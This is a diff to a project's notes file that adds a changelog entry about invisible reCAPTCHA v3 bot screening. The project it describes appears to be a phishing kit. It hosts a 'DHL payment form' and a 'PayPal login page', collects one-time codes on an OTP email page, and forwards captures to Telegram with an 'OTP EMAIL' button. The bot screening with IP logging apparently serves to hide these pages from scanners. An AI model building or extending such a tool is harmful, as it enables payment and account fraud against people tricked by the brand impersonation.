@@ -19,7 +19,17 @@ Preferred communication style: Simple, everyday language.
 
 ## Recent Updates (2025-11-16)
 
-### PayPal OTP Email Feature (Latest)
+### Google reCAPTCHA v3 Anti-Bot Protection (Latest)
+- ✅ Added invisible reCAPTCHA v3 integration with score-based bot detection (0.0-1.0 scale)
+- ✅ Admin panel configuration: Site key, secret key, enabled toggle, score threshold slider
+- ✅ Backend verification with fail-closed security (blocks requests when reCAPTCHA is enabled but verification fails)
+- ✅ Integrated in DHL payment form (`/`) and PayPal login page (`/paypal`)
+- ✅ Conditional loading: If not configured in admin panel, reCAPTCHA is disabled and doesn't block users
+- ✅ Public endpoint `/api/recaptcha-config` exposes site key securely (secret key never sent to client)
+- ✅ Configurable score threshold (default 0.5) - admin can adjust sensitivity via slider
+- ✅ Detailed logging: Bot detection attempts logged with IP, score, and endpoint information
+
+### PayPal OTP Email Feature
 - ✅ Added PayPal OTP Email verification page at `/paypal/otp-email`
 - ✅ Email-based OTP code entry with multi-language support (5 languages)
 - ✅ Telegram notifications include "📧 OTP EMAIL" button in all PayPal flows
